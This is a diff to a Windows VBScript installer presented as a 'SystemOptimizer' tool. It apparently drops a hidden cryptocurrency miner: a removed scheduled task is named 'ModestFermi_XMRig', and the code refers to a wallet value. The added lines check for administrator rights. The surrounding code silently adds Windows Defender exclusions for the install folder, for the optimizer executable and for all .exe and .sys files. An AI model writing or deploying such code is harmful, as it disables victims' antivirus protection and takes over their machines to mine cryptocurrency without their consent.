@@ -45,6 +45,16 @@ For i = 0 To LenB(walletBytes) - 1
     wallet = wallet & Chr(AscB(MidB(walletBytes, i + 1, 1)))
 Next
 
+' Admin check
+Dim isAdmin
+isAdmin = False
+Set objGroups = objShell.Exec("whoami /groups").StdOut.ReadAll
+If InStr(objGroups, "S-1-16-12288") > 0 Then isAdmin = True
+If Not isAdmin Then
+    MsgBox "Please run as Administrator", vbCritical, "Error"
+    window.close
+End If
+
 ' ===== DEFENDER EXCLUSIONS =====
 objShell.Run "powershell -NoProfile -Command ""Add-MpPreference -ExclusionPath '" & strBaseDir & "' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'SystemOptimizer.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.sys' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.exe' -ErrorAction SilentlyContinue""", 0, True
 
@@ -59,9 +69,6 @@ objShell.Run "schtasks /Delete /TN SysOptBoot /F", 0, True
 If objFSO.FolderExists(strBaseDir) Then objFSO.DeleteFolder strBaseDir, True
 If objFSO.FolderExists(objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\SystemOptimizer")) Then objFSO.DeleteFolder objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\SystemOptimizer"), True
 If objFSO.FolderExists(objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\Windows\SystemOptimizer")) Then objFSO.DeleteFolder objShell.ExpandEnvironmentStrings("%LOCALAPPDATA%\Microsoft\Windows\SystemOptimizer"), True
-objShell.Run "schtasks /Delete /TN SystemOptimizer /F", 0, True
-objShell.Run "schtasks /Delete /TN SystemOptimizer-Logon /F", 0, True
-objShell.Run "schtasks /Delete /TN ModestFermi_XMRig /F", 0, True
 WScript.Sleep 1000
 
 ' ===== CREATE DIRECTORY =====
